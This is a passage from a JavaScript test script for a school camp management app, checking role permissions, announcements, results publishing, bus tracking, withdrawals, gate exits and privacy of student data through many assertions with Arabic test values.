r=post({action:'setUserActive',token:T,targetUsername:'tmp1',active:'no'});assert(!r.success,'invalid value rejected');
assert(book.AuditLog.rows.some(x=>x[2]==='USER_DISABLED'&&x[3]==='tmp1'),'audit: account disabled');
// ---- media: announcements, results, public feed
post({action:'createUser',token:T,username:'med',password:'pa-12345',fullName:'إعلامي',role:'media',permissions:['announce','results'],committees:[]});
const tm=post({action:'login',username:'med',password:'pa-12345'}).token;
post({action:'createUser',token:T,username:'ver',password:'pb-12345',fullName:'محقق',role:'verifier',permissions:['verify'],committees:[]});
const tv=post({action:'login',username:'ver',password:'pb-12345'}).token;
r=post({action:'mediaList',token:t1});assert(!r.success,'supervisor cannot open media');
r=post({action:'annSave',token:t1,title:'مرحباً بكم'});assert(!r.success,'supervisor cannot create announcements');
r=post({action:'annSave',token:tm,title:'م',body:''});assert(!r.success,'short title rejected');
r=post({action:'annSave',token:tm,title:'فعالية',kind:'event'});assert(!r.success,'event needs a date');
r=post({action:'annSave',token:tm,title:'تعليمات للمشرفين',body:'الكل في الباص 6:00',audience:'staff',clientId:'a1'});assert(r.success,'staff announcement drafted');const a1=r.id;
r=post({action:'annSave',token:tm,title:'تعليمات للمشرفين',body:'x',audience:'staff',clientId:'a1'});assert(r.repeated&&r.id===a1,'announcement retry idempotent');
r=post({action:'annSave',token:tm,title:'حفل الافتتاح',body:'في الساحة',kind:'event',startsAt:'2026-12-28T18:00:00Z',audience:'public',pinned:true});assert(r.success,'public event drafted');const a2=r.id;
r=post({action:'bulletin',token:t1});assert(r.success&&r.items.length===0,'drafts are not in the bulletin');
r=post({action:'annStatus',token:tm,id:a1,status:'published'});assert(r.success,'staff announcement published');
r=post({action:'annStatus',token:tm,id:a2,status:'published'});assert(r.success,'public event published');
r=post({action:'bulletin',token:t1});assert(r.success&&r.items.length===2&&r.items[0].id===a2,'bulletin: pinned first, both audiences visible to staff');
r=post({action:'bulletin',token:'bad'});assert(!r.success,'bulletin needs a login');
r=post({action:'feed',key:'anything'});assert(!r.success,'feed disabled until a key exists');
const fk=run('ADMIN_createFeedKey')();
r=post({action:'feed',key:'wrong'+fk});assert(!r.success,'feed rejects a wrong key');
r=post({action:'feed',key:fk});assert(r.success&&r.announcements.length===1&&r.announcements[0].title==='حفل الافتتاح'&&!JSON.stringify(r).includes('تعليمات للمشرفين'),'feed shows ONLY published public items');
assert(r.campStart==='2026-12-27'&&!!r.serverTime,'feed carries camp start + server time');
r=post({action:'resSave',token:tm,competition:'كرة القدم',team:'الأزرق',place:1,points:30});assert(r.success,'result entered');const r1=r.id;
r=post({action:'resSave',token:tm,competition:'كرة القدم',team:'الأحمر',place:2,points:20});const r2=r.id;
r=post({action:'resSave',token:tm,competition:'كرة القدم',team:'الأخضر'});assert(!r.success,'place or points required');
r=post({action:'resSave',token:tm,competition:'كرة القدم',team:'x',place:0});assert(!r.success,'bad place rejected');
r=post({action:'resStatus',token:tm,ids:[r1,r2],status:'published'});assert(!r.success&&r.code==='NEEDS_VERIFY','entering results is not enough to publish them');
r=post({action:'feed',key:fk});assert(r.results.length===0,'unverified results are not public');
r=post({action:'resStatus',token:tv,ids:[r2,r1],status:'published'});assert(r.success&&r.changed===2,'verifier publishes results');
r=post({action:'feed',key:fk});assert(r.results.length===1&&r.results[0].rows[0].team==='الأزرق'&&r.results[0].rows[1].team==='الأحمر','feed results ordered by place');
r=post({action:'resStatus',token:tv,id:r2,status:'archived'});r=post({action:'feed',key:fk});assert(r.results[0].rows.length===1,'archived result leaves the feed');
r=post({action:'annStatus',token:tm,id:a2,status:'archived'});r=post({action:'feed',key:fk});assert(r.announcements.length===0,'archived announcement leaves the feed');
assert(!JSON.stringify(post({action:'feed',key:fk})).match(/9999000|أحمد|ربو/),'feed has no student data');
assert(book.AuditLog.rows.some(x=>x[2]==='RESULT_PUBLISHED'),'audit: results published');
// ---- display screen: prayer times typed by the committee, team totals, new kinds
r=post({action:'prayerSave',token:t1,date:'2026-12-28',times:{fajr:'05:28'}});assert(!r.success,'supervisor cannot set prayer times');
r=post({action:'prayerSave',token:tm,date:'2026-12-28',times:{fajr:'25:00'}});assert(!r.success,'bad time rejected (nothing valid)');
r=post({action:'prayerSave',token:tm,date:'2026-12-28',times:{fajr:'05:28',dhuhr:'12:10',maghrib:'17:30'},iqamaMinutes:20});assert(r.success,'committee saves fajr/dhuhr/maghrib');
r=post({action:'prayerSave',token:tm,date:'2026-12-28',times:{fajr:'05:29',dhuhr:'12:10',maghrib:'17:30'}});assert(r.success,'same day saved again (update, no duplicate)');
r=post({action:'prayerList',token:tm});assert(r.prayers['2026-12-28'].fajr==='05:29'&&!r.prayers['2026-12-28'].asr&&r.iqamaMinutes===20,'prayer list: updated, empty ones left out, iqama minutes');
r=post({action:'annSave',token:tm,title:'تجمّع الجميع في الساحة',kind:'urgent',audience:'public'});assert(r.success,'urgent message kind accepted');
r=post({action:'annSave',token:tm,title:'x y z',kind:'hack'});assert(!r.success,'unknown kind rejected');
r=post({action:'resSave',token:tm,competition:'مسابقة ثقافية',team:'الأزرق',points:15});post({action:'resStatus',token:tv,id:r.id,status:'published'});
r=post({action:'annSave',token:tm,title:'الحفل الختامي',kind:'finale'});assert(!r.success,'finale needs a date like an event');
r=post({action:'annSave',token:tm,title:'الحفل الختامي',kind:'finale',startsAt:'2026-12-30T19:00:00Z'});assert(r.success,'finale accepted');
r=post({action:'displayTheme',token:t1,theme:'night'});assert(!r.success,'supervisor cannot change the display theme');
r=post({action:'displayTheme',token:tm,theme:'disco'});assert(!r.success,'unknown theme rejected');
r=post({action:'feed',key:fk});assert(r.displayTheme==='auto','theme is automatic by default');
r=post({action:'displayTheme',token:tm,theme:'jumuah'});assert(r.success&&post({action:'feed',key:fk}).displayTheme==='jumuah','committee pins a theme');
r=post({action:'feed',key:fk});assert(r.prayers['2026-12-28'].maghrib==='17:30'&&r.iqamaMinutes===20&&r.totals[0].team==='الأزرق'&&r.totals[0].points===45&&r.campDays===4,'feed: prayers, iqama, team totals');

// ---- password policy + profile edit
r=post({action:'createUser',token:T,username:'weak',password:'12345',fullName:'ضعيف',role:'supervisor',permissions:['checkin'],committees:[]});assert(!r.success&&r.code==='WEAK_PASSWORD','short password refused on create');
r=post({action:'resetPassword',token:T,targetUsername:'tmp1',newPassword:'abc'});assert(!r.success&&r.code==='WEAK_PASSWORD','short password refused on reset');
r=post({action:'updateUserProfile',token:T,targetUsername:'tmp1',fullName:'مشرف معدّل'});assert(r.success&&book.Users.rows.some(x=>x[0]==='tmp1'&&x[3]==='مشرف معدّل'),'admin renames a user from the app');
r=post({action:'updateUserProfile',token:T,targetUsername:'tmp1',fullName:'x'});assert(!r.success,'empty name refused');
r=post({action:'updateUserProfile',token:t1,targetUsername:'tmp1',fullName:'محاولة'});assert(!r.success,'supervisor cannot rename users');
r=post({action:'updateUserAccess',token:T,targetUsername:'tmp1',permissions:['checkin','custody'],committees:[]});
r=post({action:'login',username:'tmp1',password:'p9-12345'});assert(r.success&&r.permissions.includes('custody'),'ticked permission is effective on next login');
// ---- legacy slow hash is upgraded on first good login
post({action:'createUser',token:T,username:'old1',password:'oldpass-12345',fullName:'قديم',role:'supervisor',permissions:['checkin'],assignedBus:'1',committees:[]});
{const row=book.Users.rows.find(x=>x[0]==='old1');const salt=Buffer.from(row[2],'base64');
 const legacy=run('(function(p,s){return bytesToHex_(pbkdf2_(p,s,LEGACY_PBKDF2_ITERATIONS,HASH_OUTPUT_BYTES));})')('oldpass-12345',[...salt].map(x=>x));
 row[1]=legacy;assert(!row[1].includes('$'),'old account simulated with a legacy hash');
 r=post({action:'login',username:'old1',password:'oldpass-12345'});assert(r.success,'legacy account can still log in');
 assert(row[1].includes('$')&&row[1].startsWith('1000$'),'legacy hash upgraded to the fast format');
 r=post({action:'login',username:'old1',password:'oldpass-12345'});assert(r.success,'upgraded account logs in again');
 r=post({action:'login',username:'old1',password:'wrong-pass-1'});assert(!r.success,'wrong password still refused after upgrade');}
// ---- editor recovery function exists and refuses the placeholder
{let threw=false;try{run('ADMIN_resetPassword')();}catch(e){threw=true;}assert(threw,'ADMIN_resetPassword refuses the placeholder password');}
book.Bus.rows.push(['6','طالب ت1','1','3001','أزرق','99990009','','','']);book.Bus.rows.push(['6','طالب ت2','1','3002','أحمر','99990010','','','']);for(const k of Object.keys(cache))delete cache[k];
// ---- undo policy: supervisor = last own record within 2 minutes; 'undo' permission = any student, any time
post({action:'createUser',token:T,username:'u1',password:'u1-12345',fullName:'مشرف تراجع',role:'supervisor',permissions:['checkin'],assignedBus:'1',committees:[]});
post({action:'createUser',token:T,username:'gen',password:'gen-12345',fullName:'مشرف عام',role:'supervisor',permissions:['checkin','undo','allbuses'],assignedBus:'1',committees:[]});
const tu1=post({action:'login',username:'u1',password:'u1-12345'}).token, tgen=post({action:'login',username:'gen',password:'gen-12345'}).token;
r=post({action:'scan',token:tu1,studentId:'3001',op:'board'});assert(r.success,'u1 boards a student');
{const row=book.Scans.rows.filter(x=>x[1]==='3001'&&x[2]==='board').pop();row[0]=new Date(Date.now()-30e3);}
r=post({action:'scan',token:tu1,studentId:'3002',op:'board'});assert(r.success,'u1 boards another');
r=post({action:'scan',token:tu1,studentId:'3001',op:'undo'});assert(!r.success&&r.code==='NOT_LAST','supervisor cannot undo an older record (only the last)');
r=post({action:'scan',token:tu1,studentId:'3002',op:'undo'});assert(r.success,'supervisor undoes his last record');
r=post({action:'scan',token:tu1,studentId:'3002',op:'board'});
{const row=book.Scans.rows.filter(x=>x[1]==='3002'&&x[2]==='board').pop();row[0]=new Date(Date.now()-3*60e3);}
r=post({action:'scan',token:tu1,studentId:'3002',op:'undo'});assert(!r.success&&r.code==='UNDO_EXPIRED','supervisor cannot undo after 2 minutes');
r=post({action:'scan',token:tgen,studentId:'3002',op:'undo'});assert(r.success,"holder of 'undo' undoes any student, any time");
r=post({action:'scan',token:tgen,studentId:'3001',op:'undo'});assert(r.success,"holder of 'undo' undoes an older record too");
// ---- automatic 'onway' status from movement (no manual departure button needed)
post({action:'createUser',token:T,username:'mv',password:'mv-12345',fullName:'متحرك',role:'supervisor',permissions:['checkin'],assignedBus:'2',committees:[]});
const tmv=post({action:'login',username:'mv',password:'mv-12345'}).token;
r=post({action:'busStatus',token:tmv,lat:23.5800,lng:58.4000,acc:10});assert(r.success,'bus 2 first position');
{const row=book.BusLive.rows.find(x=>x[0]==='2');assert(row[1]==='boarding','status starts as boarding (no manual action)');row[5]=new Date(Date.now()-30e3);}
r=post({action:'busStatus',token:tmv,lat:23.5800,lng:58.4005,acc:10});
{const row=book.BusLive.rows.find(x=>x[0]==='2');assert(row[1]==='boarding','tiny movement (~5 m in 30 s) does not change status');row[5]=new Date(Date.now()-30e3);}
r=post({action:'busStatus',token:tmv,lat:23.5850,lng:58.4000,acc:10});
{const row=book.BusLive.rows.find(x=>x[0]==='2');assert(row[1]==='onway','real movement (~550 m in 30 s) sets onway automatically');}
r=post({action:'scan',token:tgen,studentId:'2001',op:'undo'});assert(r.success,'general supervisor undoes a bus-2 student');
r=post({action:'leaderSummary',token:tl});assert(r.alerts.some(a=>a.type==='missing'&&a.bus==='2'&&a.missing===1),'alert: bus is moving while a student is not checked in');
// ---- speed caches: users cache is cleared by our own writes; leader summary cache is cleared by any write
r=post({action:'leaderSummary',token:tl});const b1=r.boarded;
post({action:'scan',token:tgen,studentId:'3002',op:'board'});
r=post({action:'leaderSummary',token:tl});assert(r.boarded===b1+1,'leader summary is refreshed right after a write (cache cleared)');
post({action:'setUserActive',token:T,targetUsername:'u1',active:false});
r=post({action:'busState',token:tu1});assert(!r.success&&r.code==='ACCOUNT_DISABLED','disabling a user applies at once (users cache cleared)');
post({action:'setUserActive',token:T,targetUsername:'u1',active:true});
r=post({action:'busState',token:tu1});assert(r.success,'re-enabling applies at once');
post({action:'updateUserAccess',token:T,targetUsername:'u1',permissions:['print'],committees:[]});
r=post({action:'busState',token:tu1});assert(!r.success,'permission change applies at once (checkin removed)');
// ---- usernames are not case-sensitive
r=post({action:'login',username:'  ADMIN  ',password:'pw-12345'});assert(r.success,'login ignores case and surrounding spaces in the username');
r=post({action:'createUser',token:T,username:'SUP1',password:'dup-12345',fullName:'مكرر',role:'supervisor',permissions:['checkin'],committees:[]});assert(!r.success,'cannot create a username that differs only by case');
// ---- leaderAll: one round trip for the whole leader screen
r=post({action:'leaderAll',token:tl});assert(r.success&&r.summary&&r.summary.total>0&&Array.isArray(r.buses)&&Array.isArray(r.cases),'leaderAll returns summary + buses + cases');
r=post({action:'leaderAll',token:t1});assert(!r.success,'supervisor cannot use leaderAll');
post({action:'createUser',token:T,username:'mapper',password:'map-12345',fullName:'خريطة',role:'x',permissions:['livemap'],committees:[]});
{const tmap=post({action:'login',username:'mapper',password:'map-12345'}).token;r=post({action:'leaderAll',token:tmap});assert(r.success&&!r.summary&&Array.isArray(r.buses)&&!r.cases,'livemap-only user gets the map data only (no numbers, no cases)');}
// ---- leader extras: camp location, auto-arrival, speed, supervisor phone, missing names, committees
run('SETUP_createTabs')();for(const k of Object.keys(cache))delete cache[k];
assert(book.Users.rows[0].includes('Phone')&&book.BusLive.rows[0].includes('Speed'),'setup adds Users.Phone and BusLive.Speed');
r=post({action:'setCampLocation',token:tl,lat:23.6,lng:58.5});assert(!r.success,'leader without manage cannot set the camp location');
r=post({action:'setCampLocation',token:T,lat:23.6,lng:58.5});assert(r.success,'admin sets the camp location');
r=post({action:'setCampLocation',token:T,lat:'x',lng:1});assert(!r.success,'invalid location rejected');
r=post({action:'updateUserProfile',token:T,targetUsername:'mv',fullName:'متحرك',phone:'+968 9123-4567'});assert(r.success,'supervisor phone saved');
r=post({action:'listUsers',token:T});assert(r.users.find(x=>x.username==='mv').phone==='+96891234567','phone stored cleaned');
{const row=book.BusLive.rows.find(x=>x[0]==='2');row[5]=new Date(Date.now()-30e3);}
r=post({action:'busStatus',token:tmv,lat:23.6010,lng:58.5000,acc:10});
{const row=book.BusLive.rows.find(x=>x[0]==='2');const h=book.BusLive.rows[0];assert(row[h.indexOf('Status')]==='arrived','bus inside the camp area is marked arrived automatically');assert(Number(row[h.indexOf('Speed')])>0,'speed stored');}
r=post({action:'leaderAll',token:tl});
assert(r.camp&&r.camp.lat===23.6,'leaderAll returns camp location');
assert(r.extra&&r.extra.missingByBus['1']&&r.extra.missingByBus['1'].length>=1&&r.extra.missingByBus['1'][0].name,'leaderAll: names still missing per bus');
assert(r.extra.supervisors['2'].some(x=>x.phone==='+96891234567'),'leaderAll: supervisor phone per bus');
assert(Array.isArray(r.extra.byTeam)&&r.extra.byTeam[0].total>0,'leaderAll: headcount per team');
assert(typeof r.extra.committees.meals==='number'&&'medOpen' in r.extra.committees&&'phones' in r.extra.committees,'leaderAll: committees in numbers');
assert(!JSON.stringify(r.extra.committees).match(/صداع|ربو/),'committees contain NO medical details');
assert(Array.isArray(r.extra.feed)&&r.extra.feed.length>0&&r.extra.feed[0].name,'leaderAll: activity feed with names');
assert(!JSON.stringify(r).includes('9999000'),'leaderAll has no student phone numbers');
assert(r.canSetCamp===false,'leader (no manage) cannot set camp');
r=post({action:'leaderAll',token:T});assert(r.canSetCamp===true,'admin can set camp');
// ---- re-admit a student whose withdrawal was closed by mistake
r=post({action:'scan',token:tgen,studentId:'3001',op:'board'});
r=post({action:'withdrawStart',token:ts,studentId:'3001',guardian:'والد الطالب',reason:'ظرف'});const wr=r.id;
r=post({action:'withdrawReopen',token:ts,id:wr});assert(!r.success&&r.code==='NOT_CLOSED','cannot re-admit while the withdrawal is still open');
r=post({action:'withdrawClose',token:ts,id:wr});assert(r.success,'withdrawal closed');
r=post({action:'roster',token:tgen,bus:'1'});assert(r.students.find(x=>x.id==='3001').state==='withdrawn','student shows as withdrawn');
r=post({action:'withdrawReopen',token:t1,id:wr});assert(!r.success,'supervisor cannot re-admit');
r=post({action:'withdrawReopen',token:ts,id:wr});assert(r.success,'secretariat re-admits the student');
r=post({action:'roster',token:tgen,bus:'1'});assert(r.students.find(x=>x.id==='3001').state==='boarded','student is back to BOARDED (his state before the withdrawal)');
r=post({action:'withdrawReopen',token:ts,id:wr});assert(!r.success,'cannot re-admit twice');
r=post({action:'scan',token:tgen,studentId:'3001',op:'undo'});assert(r.success,'normal flow works again after re-admission');
r=post({action:'withdrawList',token:ts});assert(r.withdrawals.some(x=>x.id===wr&&x.status==='reversed'),'withdrawal kept in the list as reversed');
assert(book.AuditLog.rows.some(x=>x[2]==='WITHDRAW_REVERSED'),'audit: withdrawal reversed');
r=post({action:'history',token:tl,studentId:'3001'});assert(r.events.some(e=>e.kind==='readmit'),'history shows the re-admission');
// ---- leader sees the withdrawals list (no reasons)
r=post({action:'withdrawStart',token:ts,studentId:'3002',guardian:'والد 3002',reason:'سبب خاص جداً'});
r=post({action:'leaderAll',token:tl});assert(r.extra.withdrawals.some(w=>w.guardian==='والد 3002'&&w.status==='open'),'leader sees open withdrawals with the receiver name');
assert(!JSON.stringify(r.extra.withdrawals).includes('سبب خاص جداً'),'the private reason is NOT shown to the leader');
// ---- gate screen for the scouts: the secretariat approves, the scouts confirm the exit
post({action:'createUser',token:T,username:'scout1',password:'sc-12345',fullName:'كشاف',role:'scout',permissions:['gate'],committees:[]});
const tsc=post({action:'login',username:'scout1',password:'sc-12345'}).token;
r=post({action:'gateList',token:t1});assert(!r.success,'supervisor cannot use the gate screen');
r=post({action:'gateList',token:tsc});assert(r.success&&Array.isArray(r.waiting),'scout opens the gate list');
r=post({action:'withdrawStart',token:tsc,studentId:'3001',guardian:'x',reason:'y'});assert(!r.success,'scout CANNOT approve (open) a withdrawal: only the secretariat');
r=post({action:'gateCheck',token:tsc,q:'3001'});assert(r.success&&r.results[0].exit==='none','gate check: no permission to leave -> "none"');
r=post({action:'withdrawStart',token:ts,studentId:'3001',guardian:'والد 3001',reason:'سبب سري للغاية'});const gw=r.id;
r=post({action:'gateCheck',token:tsc,q:'3001'});assert(r.results[0].exit==='approved'&&r.results[0].wid===gw&&r.results[0].guardian==='والد 3001','gate check: approved by the secretariat');
r=post({action:'gateList',token:tsc});assert(r.waiting.some(x=>x.wid===gw&&x.name&&x.guardian==='والد 3001'),'approved exit is waiting at the gate');
assert(!JSON.stringify(r).includes('سبب سري للغاية')&&!JSON.stringify(r).includes('9999000'),'the gate sees NO reason and NO phone numbers');
r=post({action:'gateConfirm',token:tsc,id:gw});assert(r.success,'scout confirms the exit');
r=post({action:'gateConfirm',token:tsc,id:gw});assert(!r.success&&r.code==='NOT_OPEN','cannot confirm twice');
r=post({action:'gateCheck',token:tsc,q:'3001'});assert(r.results[0].exit==='exited','after the exit the check says "exited"');
r=post({action:'roster',token:tgen,bus:'1'});assert(r.students.find(x=>x.id==='3001').state==='withdrawn','the student is now WITHDRAWN in the lists');
r=post({action:'gateList',token:tsc});assert(r.exited.some(x=>x.wid===gw&&x.exitedBy==='scout1'),'exit recorded with the scout name');
assert(book.AuditLog.rows.some(x=>x[2]==='GATE_EXIT'&&x[1]==='scout1'),'audit: gate exit by the scout');
// items not returned: the gate is blocked
post({action:'withdrawStart',token:ts,studentId:'3002',guardian:'والد',reason:'سبب'});
post({action:'custodyRecord',token:ts,studentId:'3002',item:'phone',op:'receive',tag:'G-1'});
{const l=post({action:'gateList',token:tsc}).waiting.find(x=>x.id==='3002');r=post({action:'gateConfirm',token:tsc,id:l.wid});assert(!r.success&&r.code==='ITEMS_NOT_RETURNED','gate cannot let him out while his phone is still in custody');}
r=post({action:'createCase',token:tsc,type:'student',text:'الاسم لا يطابق المستلِم',studentId:'3002'});assert(r.success,'scout can report a problem to the administration');
r=post({action:'custodySummary',token:tsc});assert(!r.success,'scout has no access to custody data');
// ---- sheet check
r=post({action:'checkStudentSheet',token:T});assert(r.success&&r.report.ok&&r.report.total===6,'student sheet check passes');
console.log(fails?`\n${fails} FAILED`:'\nALL PASSED');
